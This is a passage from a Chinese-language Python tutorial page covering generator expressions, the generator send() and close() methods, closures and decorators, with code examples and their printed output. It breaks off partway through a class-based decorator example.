而每次只需要获取一个元素时，应当考虑使用生成器表达式而不是列表解析。生成器表达式的语法和列表解析一样，只不过生成器表达式是被<code>()</code>括起来的，而不是<code>[]</code>，如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(expr <span class="keyword">for</span> iter_var <span class="keyword">in</span> iterable <span class="keyword">if</span> cond_expr)</span><br></pre></td></tr></table></figure><p>生成器表达式并不是创建一个列表， 而是返回一个生成器，这个生成器在每次计算出一个条目后，把这个条目”产生”（yield）出来。 生成器表达式使用了”惰性计算”（lazy evaluation），只有在检索时才被赋值（evaluated），所以在列表比较长的情况下使用内存上更有效。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gen = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>) <span class="keyword">if</span> i % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__iter__&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__next__&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gen))</span><br><span class="line"><span class="comment"># 使用sum求和之后会导致再次迭代所获取的值为空</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>(gen))</span><br><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> gen])</span><br></pre></td></tr></table></figure><h5 id="生成器中的send-与close-方法"><a href="#生成器中的send-与close-方法" class="headerlink" title="生成器中的send()与close()方法"></a>生成器中的<code>send()</code>与<code>close()</code>方法</h5><p>生成器中还有两个很重要的方法：<code>send()</code>和<code>close()</code>。</p><ul><li><p><code>send(value)</code>:</p><p>从前面了解到，<code>next()</code>方法可以恢复生成器状态并继续执行，其实<code>send()</code>是除<code>next()</code>外另一个恢复生成器的方法。</p><p>Python 2.5中，<code>yield</code>语句变成了<code>yield</code>表达式，也就是说<code>yield</code>可以有一个值，而这个值就是<code>send()</code>方法的参数，所以<code>send(None)</code>和<code>next()</code>是等效的。同样，<code>next()</code>和<code>send()</code>的返回值都是<code>yield</code>语句处的参数<code>(yielded value)</code></p><p>关于<code>send()</code>方法需要注意的是：调用send传入非None值前，生成器必须处于挂起状态，否则将抛出异常。也就是说，第一次调用时，要使用<code>next()</code>语句或<code>send(None)</code>，因为没有<code>yield</code>语句来接收这个值。</p></li><li><p><code>close()</code>:</p><p>这个方法用于关闭生成器，对关闭的生成器后再次调用<code>next</code>或<code>send</code>将抛出<code>StopIteration</code>异常。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_range</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        val = <span class="keyword">yield</span> i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;val is: &#x27;</span>, val)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_range = my_range(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_range.__next__())</span><br><span class="line"><span class="built_in">print</span>(my_range.__next__())</span><br><span class="line"><span class="built_in">print</span>(my_range.send(<span class="string">&#x27;hello&#x27;</span>))</span><br><span class="line">my_range.close()</span><br><span class="line"><span class="built_in">print</span>(my_range.send(<span class="string">&#x27;world&#x27;</span>))</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>生成器是一种特殊的迭代器，内部支持了生成器协议，不需要明确定义<code>__iter__()</code>和<code>__next__()</code>方法。</li><li>生成器通过生成器函数产生，生成器函数可以通过常规的def语句来定义，但是不用<code>return</code>返回，而是用<code>yield</code>一次返回一个结果。</li></ul><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><h5 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h5><p>想想看怎样用程序实现下面的功能呢？</p><p>在一个聊天软件中显示是谁发送了这条信息，即：一条信息标记了是谁发送的</p><p>今天我们要研究的知识点是<code>闭包</code>，实现上述功能的方式可能有多种，但是闭包会更简单。</p><h5 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h5><blockquote><p>普通方式</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">user_name, content</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(%s):%s&quot;</span> % (user_name, content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_name1 = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">user_name2 = <span class="string">&quot;双双&quot;</span></span><br><span class="line"></span><br><span class="line">say(user_name1, <span class="string">&quot;今天吃了么？&quot;</span>)</span><br><span class="line">say(user_name2, <span class="string">&quot;吃了~&quot;</span>)</span><br><span class="line"></span><br><span class="line">say(user_name1, <span class="string">&quot;吃了啥？&quot;</span>)</span><br><span class="line">say(user_name2, <span class="string">&quot;半只牛~&quot;</span>)</span><br><span class="line"></span><br><span class="line">say(user_name1, <span class="string">&quot;为啥不给我吃？&quot;</span>)</span><br><span class="line">say(user_name2, <span class="string">&quot;我一个人刚刚好~~&quot;</span>)</span><br><span class="line"></span><br><span class="line">say(user_name1, <span class="string">&quot;友谊的小船说翻就翻！&quot;</span>)</span><br><span class="line">say(user_name2, <span class="string">&quot;我会游泳~~~&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(安娜):今天吃了么？</span><br><span class="line">(双双):吃了~</span><br><span class="line">(安娜):吃了啥？</span><br><span class="line">(双双):半只牛~</span><br><span class="line">(安娜):为啥不给我吃？</span><br><span class="line">(双双):我一个人刚刚好~~</span><br><span class="line">(安娜):友谊的小船说翻就翻！</span><br><span class="line">(双双):我会游泳~~~</span><br></pre></td></tr></table></figure><p>小总结：</p><ul><li>上述代码已经实现了要求，但是每次发送信息时需要将用户名称传递到<code>say</code>函数中，相对比较麻烦</li></ul><blockquote><p>面向对象的方式解决上述问题</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.user_name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self, content</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(%s):%s&quot;</span> % (self.user_name, content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = Person(<span class="string">&quot;安娜&quot;</span>)</span><br><span class="line">p2 = Person(<span class="string">&quot;双双&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1.say(<span class="string">&quot;今天吃了么？&quot;</span>)</span><br><span class="line">p2.say(<span class="string">&quot;吃了~&quot;</span>)</span><br><span class="line">p1.say(<span class="string">&quot;吃了啥？&quot;</span>)</span><br><span class="line">p2.say(<span class="string">&quot;半只牛~&quot;</span>)</span><br><span class="line">p1.say(<span class="string">&quot;为啥不给我吃？&quot;</span>)</span><br><span class="line">p2.say(<span class="string">&quot;我一个人刚刚好~~&quot;</span>)</span><br><span class="line">p1.say(<span class="string">&quot;友谊的小船说翻就翻！&quot;</span>)</span><br><span class="line">p2.say(<span class="string">&quot;我会游泳~~~&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(安娜):今天吃了么？</span><br><span class="line">(双双):吃了~</span><br><span class="line">(安娜):吃了啥？</span><br><span class="line">(双双):半只牛~</span><br><span class="line">(安娜):为啥不给我吃？</span><br><span class="line">(双双):我一个人刚刚好~~</span><br><span class="line">(安娜):友谊的小船说翻就翻！</span><br><span class="line">(双双):我会游泳~~~</span><br></pre></td></tr></table></figure><p>小总结：</p><ul><li>通过面向对象的方式能够实现上述要求，但是发现使用了类以及对象，总体感觉还是较为复杂，再者说继承的object类中有很多默认的方法，既然这个程序不需要，显然会造成一定的浪费</li></ul><blockquote><p>使用闭包解决上述问题</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">person</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">content</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(%s):%s&quot;</span> % (name, content))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> say</span><br><span class="line"></span><br><span class="line">p1 = person(<span class="string">&quot;安娜&quot;</span>)</span><br><span class="line">p2 = person(<span class="string">&quot;双双&quot;</span>)</span><br><span class="line"></span><br><span class="line">p1(<span class="string">&quot;今天吃了么？&quot;</span>)</span><br><span class="line">p2(<span class="string">&quot;吃了~&quot;</span>)</span><br><span class="line">p1(<span class="string">&quot;吃了啥？&quot;</span>)</span><br><span class="line">p2(<span class="string">&quot;半只牛~&quot;</span>)</span><br><span class="line">p1(<span class="string">&quot;为啥不给我吃？&quot;</span>)</span><br><span class="line">p2(<span class="string">&quot;我一个人刚刚好~~&quot;</span>)</span><br><span class="line">p1(<span class="string">&quot;友谊的小船说翻就翻！&quot;</span>)</span><br><span class="line">p2(<span class="string">&quot;我会游泳~~~&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="函数引用"><a href="#函数引用" class="headerlink" title="函数引用"></a>函数引用</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义函数可以理解为：</span></span><br><span class="line"><span class="comment"># 定义了一个全局变量，其变量名字是函数的名字，即test</span></span><br><span class="line"><span class="comment"># 这个test变量指向了一个代码块，这个代码块是函数</span></span><br><span class="line"><span class="comment"># 其实就是说test保存了一个代码块的地址，即引用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- in test func----&quot;</span>)</span><br><span class="line"></span><br><span class="line">test()  <span class="comment"># 这是调用函数</span></span><br><span class="line"></span><br><span class="line">ret = test <span class="comment"># 用另外一个变量 复制了 test这个引用，导致ret变量也指向那个 函数代码块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面输出的2个地址信息是相同的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(ret))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(test))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过引用调用函数</span></span><br><span class="line">ret()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--- <span class="keyword">in</span> test func----</span><br><span class="line"><span class="number">140212571149040</span></span><br><span class="line"><span class="number">140212571149040</span></span><br><span class="line">--- <span class="keyword">in</span> test func----</span><br></pre></td></tr></table></figure><h5 id="闭包的概念"><a href="#闭包的概念" class="headerlink" title="闭包的概念"></a>闭包的概念</h5><p>闭包(closure) 定义非常抽象，很难看懂</p><p>下面尝试从概念上去理解一下闭包：</p><ul><li>在一些语言中，在函数中可以（嵌套）定义另一个函数时，如果内部的函数引用了外部的函数的变量，则可能产生闭包。闭包可以用来在一个函数与一组“私有”变量之间创建关联关系。在给定函数被多次调用的过程中，这些私有变量能够保持其持久性。 —— 维基百科<code>https://zh.wikipedia.org/wiki/闭包_(计算机科学)</code></li></ul><p>用比较容易懂的人话说：就是当某个函数被当成对象返回时，夹带了外部变量，就形成了一个闭包。可以这样理解，闭包就是能够读取其他函数内部变量的函数</p><p>看如下案例，便于理解什么是闭包：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_printer</span>(<span class="params">msg</span>):  <span class="comment"># 可以认为是 外部函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printer</span>():  <span class="comment"># 可以认为是 内部函数</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">return</span> printer  <span class="comment"># 返回的内部函数的引用</span></span><br><span class="line"></span><br><span class="line">printer = make_printer(<span class="string">&#x27;Good!&#x27;</span>)</span><br><span class="line">printer()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Good</span><br></pre></td></tr></table></figure><h5 id="闭包案例"><a href="#闭包案例" class="headerlink" title="闭包案例"></a>闭包案例</h5><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_in</span>(<span class="params">number_in</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;in test_in 函数, number_in is %d&quot;</span> % number_in)</span><br><span class="line">        <span class="keyword">return</span> number + number_in</span><br><span class="line">    <span class="keyword">return</span> test_in</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给test函数赋值，这个20就是给参数number</span></span><br><span class="line">ret = test(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意这里的100其实给参数number_in</span></span><br><span class="line"><span class="built_in">print</span>(ret(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意这里的200其实给参数number_in</span></span><br><span class="line"><span class="built_in">print</span>(ret(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">in test_in 函数, number_in is 100</span><br><span class="line">120</span><br><span class="line">in test_in 函数, number_in is 200</span><br><span class="line">220</span><br></pre></td></tr></table></figure><h5 id="使用闭包需要注意的问题"><a href="#使用闭包需要注意的问题" class="headerlink" title="使用闭包需要注意的问题"></a>使用闭包需要注意的问题</h5><p>由于闭包会携带包含它的函数的作用域，因此会比其他函数占用更多的内存。因此可以手动解除对匿名函数的引用，以便释放内存。</p><h5 id="使用闭包修改外部函数中的变量"><a href="#使用闭包修改外部函数中的变量" class="headerlink" title="使用闭包修改外部函数中的变量"></a>使用闭包修改外部函数中的变量</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">counter</span>(<span class="params">start=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_one</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> start  <span class="comment"># nonlocal 关键字用于在嵌套函数内部使用变量，其中变量不应属于内部函数。</span></span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> start</span><br><span class="line">    <span class="keyword">return</span> add_one</span><br><span class="line"></span><br><span class="line">c1 = counter(<span class="number">5</span>)  <span class="comment"># 创建一个闭包</span></span><br><span class="line"><span class="built_in">print</span>(c1())</span><br><span class="line"><span class="built_in">print</span>(c1())</span><br><span class="line"></span><br><span class="line">c2 = counter(<span class="number">50</span>)  <span class="comment"># 创建另外一个闭包</span></span><br><span class="line"><span class="built_in">print</span>(c2())</span><br><span class="line"><span class="built_in">print</span>(c2())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c1())</span><br><span class="line"><span class="built_in">print</span>(c1())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c2())</span><br><span class="line"><span class="built_in">print</span>(c2())</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">7</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td></tr></table></figure><h5 id="多个闭包"><a href="#多个闭包" class="headerlink" title="多个闭包"></a>多个闭包</h5><p>如上面的代码中，调用了2次<code>counter</code>，也就意味着创建了2个闭包，并且每个闭包之间没有任何关系。</p><p>大家是否有种感觉，好像闭包与对象有些类似。确实是这样的，对象其实可通俗的理解为数据(属性) + 功能(方法)，而闭包也可以理解为数据 + 功能，只不过此时数据是外部函数中的那些局部变量或者形参，而功能则是内部函数。对象适合完成较为复杂的功能，而闭包则更轻量</p><h5 id="闭包总结"><a href="#闭包总结" class="headerlink" title="闭包总结"></a>闭包总结</h5><ol><li>闭包定义是在函数内再嵌套函数</li><li>闭包是可以访问另一个函数局部作用域中变量的函数</li><li>闭包可以读取另外一个函数内部的变量</li><li>闭包可以让参数和变量不会被垃圾回收机制回收，始终保持在内存中（而普通的函数调用结束后 会被Python解释器自动释放局部变量）</li></ol><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>装饰器是python语言中的语法糖，可以通过装饰器对函数的功能进行拓展。</p><h5 id="为什么需要装饰器"><a href="#为什么需要装饰器" class="headerlink" title="为什么需要装饰器"></a>为什么需要装饰器</h5><p>我们假设你的程序实现了<code>say_hello()</code>和<code>say_goodbye()</code>两个函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_goodbye</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)  <span class="comment"># 此处应打印goodbye</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    say_hello()</span><br><span class="line">    say_goodbye()</span><br></pre></td></tr></table></figure><p>假设上述代码中的say_goodbye函数出现了bug，为了之后能更好的维护，现在需要在调用方法前记录函数调用名称，以定位出错位置。</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[DEBUG]: Enter say_hello()</span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">[DEBUG]: Enter say_goodbye()</span><br><span class="line">Goodbye!</span><br></pre></td></tr></table></figure><p>实现方式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter say_hello()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_goodbye</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter say_goodbye()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    say_hello()</span><br><span class="line">    say_goodbye()</span><br></pre></td></tr></table></figure><p>对上述代码进行优化：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">import</span> inspect</span><br><span class="line">    caller_name = inspect.stack()[<span class="number">1</span>][<span class="number">3</span>]  <span class="comment"># 可以返回函数名与当前函数的返回值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter &#123;&#125;()&quot;</span>.<span class="built_in">format</span>(caller_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    debug()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_goodbye</span>():</span><br><span class="line">    debug()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;goodbye!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    say_hello()</span><br><span class="line">    say_goodbye()</span><br></pre></td></tr></table></figure><p>上述代码需要在每个业务函数里都要调用一下<code>debug()</code>函数，是不是很难受？万一老板说say相关的函数不用debug，do相关的才需要呢？</p><p>那么装饰器这时候应该登场了。</p><blockquote><p>装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。</p></blockquote><p>概括的讲，装饰器的作用就是<strong>为已经存在的函数或对象添加额外的功能</strong>。</p><h5 id="如何实现一个装饰器"><a href="#如何实现一个装饰器" class="headerlink" title="如何实现一个装饰器"></a>如何实现一个装饰器</h5><p>在早些时候 (Python Version &lt; 2.4，2004年以前)，为一个函数添加额外功能的写法是这样的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter &#123;&#125;()&quot;</span>.<span class="built_in">format</span>(func.__name__))</span><br><span class="line">        <span class="keyword">return</span> func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say_hello = debug(say_hello)</span><br><span class="line"></span><br><span class="line">say_hello()</span><br></pre></td></tr></table></figure><p>上面的debug函数其实已经是一个装饰器了，它对原函数做了包装并返回了另外一个函数，额外添加了一些功能。因为这样写实在不太优雅，在后面版本的Python中支持了@语法糖，下面代码等同于早期的写法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter &#123;&#125;()&quot;</span>.<span class="built_in">format</span>(func.__name__))</span><br><span class="line">        <span class="keyword">return</span> func()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@debug</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say_hello()</span><br></pre></td></tr></table></figure><p>这是最简单的装饰器，但是有一个问题，如果被装饰的函数需要传入参数，那么这个装饰器就坏了。因为返回的函数并不能接受参数，你可以指定装饰器函数<code>wrapper</code>接受和原函数一样的参数，比如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">something</span>):  <span class="comment"># 指定一毛一样的参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter &#123;&#125;()&quot;</span>.<span class="built_in">format</span>(func.__name__))</span><br><span class="line">        <span class="keyword">return</span> func(something)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper  <span class="comment"># 返回包装过函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@debug</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello &#123;&#125;!&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;顾安&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样你就解决了一个问题，但又多了N个问题。因为函数有千千万，你只管你自己的函数，别人的函数参数是什么样子，鬼知道？还好Python提供了可变参数<code>*args</code>和关键字参数<code>**kwargs</code>，有了这两个参数，装饰器就可以用于任意目标函数了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter &#123;&#125;()&quot;</span>.<span class="built_in">format</span>(func.__name__))</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@debug</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello &#123;&#125;!&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;顾安&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="带参数的装饰器"><a href="#带参数的装饰器" class="headerlink" title="带参数的装饰器"></a>带参数的装饰器</h5><p>假设我们前文的装饰器需要完成的功能不仅仅是能在进入某个函数后打出log信息，而且还需指定log的级别，那么装饰器就会是这样的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">logging</span>(<span class="params">level</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">func</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">inner_wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&#123;level&#125;]: enter function &#123;func&#125;()&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                level=level,</span><br><span class="line">                func=func.__name__))</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> inner_wrapper</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@logging(<span class="params">level=<span class="string">&#x27;INFO&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;say &#123;&#125;!&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有使用@语法，等同于</span></span><br><span class="line"><span class="comment"># say = logging(level=&#x27;INFO&#x27;)(say)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@logging(<span class="params">level=<span class="string">&#x27;DEBUG&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;do &#123;&#125;...&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    say(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">    do(<span class="string">&quot;my work&quot;</span>)</span><br></pre></td></tr></table></figure><p>是不是有一些晕？你可以这么理解，当带参数的装饰器被打在某个函数上时，比如<code>@logging(level=&#39;DEBUG&#39;)</code>，它其实是一个函数，会马上被执行，只要它返回的结果是一个装饰器时，那就没问题。细细再体会一下。</p><h5 id="基于类的装饰器"><a href="#基于类的装饰器" class="headerlink" title="基于类的装饰器"></a>基于类的装饰器</h5><p>装饰器函数其实是这样一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在Python中一般callable对象都是函数，但也有例外。只要某个对象重载了<code>__call__()</code>方法，那么这个对象就是callable的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;call me!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = Test()</span><br><span class="line">t()  <span class="comment"># call me</span></span><br></pre></td></tr></table></figure><p>像<code>__call__</code>这样前后都带下划线的方法在Python中被称为内置方法，有时候也被称为魔法方法。重载这些魔法方法一般会改变对象的内部行为。上面这个例子就让一个类对象拥有了被调用的行为。</p><p>回到装饰器上的概念上来，装饰器要求接受一个callable对象，并返回一个callable对象。那么用类来实现也是也可以的。我们可以让类的构造函数<code>__init__()</code>接受一个函数，然后重载<code>__call__()</code>并返回一个函数，也可以达到装饰器函数的效果。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Logging</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func</span>):</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]: enter function &#123;func&#125;()&quot;</span>.<span 